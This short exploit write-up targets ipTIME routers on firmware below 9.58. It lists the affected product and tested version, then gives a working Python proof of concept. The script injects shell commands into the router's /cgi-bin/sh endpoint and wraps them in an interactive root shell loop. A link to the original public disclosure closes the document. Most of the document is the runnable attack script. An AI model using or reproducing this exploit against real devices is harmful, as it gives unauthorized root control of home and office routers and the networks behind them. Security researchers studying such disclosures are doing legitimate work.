# ipTIME Router firmwares < 9.58 RCE with root privileges
## The Basics
Product : <a href="https://pierrekim.github.io/blog/2015-05-05-127-iptime-routers-wifiaps-modems-firewalls-models-vulnerable-with-RCE-with-root-privileges.html">total 127 devices were affected (ipTIME Router firmwares < 9.58)</a>
Tested Version : ipTIME N604R Version 9.24
Bug-class : Remote Code Execution (Command Injection)

## Exploit PoC
```python
import os
import sys
import requests

def exploit(command, current_dir):
    url = 'http://192.168.0.1/cgi-bin/sh'
    headers = {
        'Content-Type': 'text/plain',
        'User-Agent': 'Mozilla/5.0'
    }
    if not command.endswith(';'):
        command+=";"
    data = f"X=X;echo 'Content-type: text/plain';echo;cd {current_dir};{command}"
    res = requests.post(url, headers=headers, data=data)
    return res.text

if __name__ == "__main__":
    current_dir = "/"
    while True:
        command = input(f"[ root@192.168.0.1:{current_dir} ]\n $ ")
        if command.startswith("cd "):
            path = command.split(" ", 1)[1]
            current_dir = os.path.normpath(os.path.join(current_dir, path))
            continue
        elif command == "clear" or command == "cls":
            os.system("clear")
        elif command == "exit":
            sys.exit()
        else:
            try:
                result = exploit(command, current_dir)
                if command.strip().startswith("pwd"):
                    current_dir = result.strip()
                print('\n' + result)
            except:
                pass
```

## Reference
<a href="https://pierrekim.github.io/blog/2015-07-01-poc-with-RCE-against-127-iptime-router-models.html">https://pierrekim.github.io/blog/2015-07-01-poc-with-RCE-against-127-iptime-router-models.html</a>
